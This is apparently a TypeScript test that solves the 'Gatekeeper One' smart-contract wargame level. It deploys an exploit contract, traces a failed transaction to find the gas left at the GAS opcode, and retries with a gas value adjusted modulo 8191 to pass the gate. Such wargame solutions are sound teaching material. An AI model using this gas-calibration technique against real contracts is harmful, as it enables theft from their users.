import { expectLevelSolved } from "../utils";
import { deploymentConfirmation, txConfirmation } from "./utils";

type OpLog = {
  op: string;
  gas: number;
  gasCost: number;
}

type TxError = {
  transactionHash: string;
}

describe("Gatekeeper One Solution", function () {
  it("Should solve the level", expectLevelSolved({
    deployId: "13", 
    solutionFn: async ({ challenge }) => {
      const exploit = await deploymentConfirmation("GatekeeperOneSolution", challenge.address)

      const initialGuess = 1000000;
      const gasLimit = 1500000;
      let txHash = "";

      try {
        await txConfirmation(exploit.exploit(initialGuess, {gasLimit}));
        return; // if the initial guess is right, can just return 😅
      } catch (e) {
        txHash = (e as TxError).transactionHash;
      }

      const trace = await challenge.provider.send('debug_traceTransaction', [ txHash ]);
      const {gas: gasLeftBeforeGASOp, gasCost: gasOpGasCost} = trace.structLogs.find((l: OpLog) => l.op == "GAS");
      const gasLeftEvaled = gasLeftBeforeGASOp - gasOpGasCost
      
      await txConfirmation(
        exploit.exploit(initialGuess - (gasLeftEvaled % 8191), {gasLimit})
      );
    }
  }));
});
